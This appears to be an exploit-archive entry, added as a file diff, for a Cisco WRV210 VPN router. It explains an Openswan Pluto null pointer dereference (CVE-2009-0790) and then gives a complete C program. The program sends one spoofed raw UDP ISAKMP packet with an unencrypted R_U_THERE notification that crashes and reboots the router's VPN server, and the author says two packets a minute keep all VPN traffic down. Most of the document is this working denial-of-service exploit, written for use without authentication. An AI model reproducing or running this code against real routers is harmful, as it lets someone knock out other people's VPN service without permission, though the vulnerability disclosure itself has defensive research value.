@@ -1,0 +1,173 @@
+id: 14182
+date: 09/25/2010
+title: Cisco WRV210 null pointer dereference
+author: j5r9pn3lka
+cves: 
+
+=====================================
+Cisco WRV210 null pointer dereference
+=====================================
+
+/*
+
+2010-09-24 by Paolo j5r9pn3lka yahoo dot com 
+
+Product: Cisco WRV210 Wireless-G VPN Router - RangeBooster
+
+Type: denial of service exploit - null pointer dereference
+
+Remotely exploitable: yes
+
+Software: Openswan Version 2.4.5dr32 [bug: CVE-2009-0790, reported by Gerd v. Egidy of Intra2net AG]
+
+Vulnerability: VPN server crashes and reboots after one crafted 72 bytes UDP packet,
+and all the peers connected must wait and renegotiate.
+Therefore, it is possible to effectively disrupt all the VPN traffic on the target router,
+sending only 2 packets per minute. 
+
+Pros: no need for authentication, and it works with UDP spoofed-source packets.
+
+Firmware affected:
+- 2.0.0.11 (current)
+- 1.1.17.9
+
+Vulnerability details:
+this piece of crap still has a DPD attack vulnerable Openswan Pluto server,
+_always_ running (Openswan Version 2.4.5dr32).
+Lot of Cisco legal blurb about GPL etc, but if you buy this box [as I stupidly did],
+you'll end up having a linux-based, malfunctioning, grossly outdated, insecure,
+with a completely closed-source firmware, door stopper.
+So, seen that there werent publicly available exploits for this vuln,
+I've studied a bit the code, and wrote this one.
+
+Exploit details:
+in demux.c, in "case ISAKMP_XCHG_INFO", if packet's ISAKMP_FLAG_ENCRYPTION is 0x00,
+and the packet contains a DPD type R_U_THERE or R_U_THERE_ACK notification,
+it doesnt matter if the icookie, rcookie and messageid values dont match with a valid SA key:
+you'll go anyway to "static stf_status informational(struct msg_digest *md)" function,
+where respectively "dpd_inI_outR" and "dpd_inR" will be called,
+leading to the null pointer "st" dereference, exactly because no match with a valid key was found.
+So, its enough to send an ISAKMP "informational exchange" type (ISAKMP_XCHG_INFO) packet,
+containing the specific unencrypted notification (R_U_THERE or R_U_THERE_ACK) payload,
+and the Pluto server invariably crashes, with a nice "Segmentation fault" message viewable
+in the web panel log.
+
+[UDP packet sending code stolen from "arnudp.c version 0.01 by Arny - cs6171@scitsc.wlv.ac.uk"]
+
+*/
+
+
+#include<sys/types.h>
+#include<sys/socket.h>
+#include<netinet/in_systm.h>
+#include<netinet/in.h>
+#include<netinet/ip.h>
+#include<netinet/udp.h>
+#include<errno.h>
+#include<string.h>
+#include<netdb.h>
+#include<arpa/inet.h>
+#include<stdio.h>
+#include<stdlib.h>
+
+struct sockaddr sa;
+
+main(int argc,char **argv)
+{
+int fd;
+int x=1;
+struct sockaddr_in *p;
+struct hostent *he;
+u_char gram[72]="\x45\x00\x00\x26"
+		"\x12\x34\x00\x00"
+		"\xff\x11\x00\x00"
+		"\x00\x00\x00\x00" /* will be filled with source address */
+		"\x00\x00\x00\x00" /* will be filled with target address */
+		"\x00\x00\x00\x00" /* will be filled with source and target ports */
+		"\x00\x34\x00\x00" /* length of datagram */
+
+"\x00\x00\x00\x00" /* non-ESP marker */
+/* begin ISAKMP message */
+"\xff\xff\xff\xff\xff\xff\xff\xff" /* initiator cookie */
+"\xff\xff\xff\xff\xff\xff\xff\xff" /* responder cookie*/
+		"\x0b"	/* next payload type: ISAKMP_NEXT_N (notification) */
+		"\x10"	/* ISAKMP version: ISAKMP Version 1.0 */
+		"\x05"	/* exchange type: ISAKMP_XCHG_INFO (informational) */
+		"\x00"	/* flag: ISAKMP_FLAG_ENCRYPTION (none) */
+"\xff\xff\xff\xff"	/* message ID */
+"\x00\x00\x00\x28"	/* length of ISAKMP message */
+/* begin notification payload */
+		"\x00"	/* next payload type: ISAKMP_NEXT_NONE (none) */
+		"\x00"	/* RESERVED, must be 0 */
+	"\x00\x0c"	/* length of ISAKMP notification payload */
+"\x00\x00\x00\x01"	/* domain of interpretation: ISAKMP_DOI_IPSEC */
+		"\x01"	/* protocol ID: PROTO_ISAKMP */
+		"\x00"	/* SPI size [should be 16, but here it works, null pointer dereference happens anyway] */
+	"\x8d\x28";	/* notify message type: R_U_THERE */
+/* endof notification payload */
+/* endof ISAKMP message */
+
+
+
+if(argc!=4)
+	{
+	fprintf(stderr,"usage: %s source address, source port, target address\n",*argv);
+	exit(1);
+	};
+
+if((he=gethostbyname(argv[1]))==NULL)
+	{
+	fprintf(stderr,"can't resolve source address\n");
+	exit(1);
+	};
+bcopy(*(he->h_addr_list),(gram+12),4);
+
+if((he=gethostbyname(argv[3]))==NULL)
+	{
+	fprintf(stderr,"can't resolve target address\n");
+	exit(1);
+	};
+bcopy(*(he->h_addr_list),(gram+16),4);
+
+*(u_short*)(gram+20)=htons((u_short)atoi(argv[2]));
+*(u_short*)(gram+22)=htons(4500);
+
+p=(struct sockaddr_in*)&sa;
+p->sin_family=AF_INET;
+bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));
+
+if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)
+	{
+	perror("socket");
+	exit(1);
+	};
+
+#ifdef IP_HDRINCL
+fprintf(stderr,"we have IP_HDRINCL :-)\n\n");
+if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)
+	{
+	perror("setsockopt IP_HDRINCL");
+	exit(1);
+        };
+#else
+fprintf(stderr,"we don't have IP_HDRINCL :-(\n\n");
+#endif
+
+if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct sockaddr)))== -1)
+	{
+	perror("sendto");
+	exit(1);
+	};
+
+printf("datagram sent without error:\n");
+for(x=0;x<(sizeof(gram)/sizeof(u_char));x++)
+	{
+	if(!(x%4)) putchar('\n');
+	printf("%02x",gram[x]);
+	};
+putchar('\n');
+}
+
+
+
+#  0day.today [2023-03-23]  #
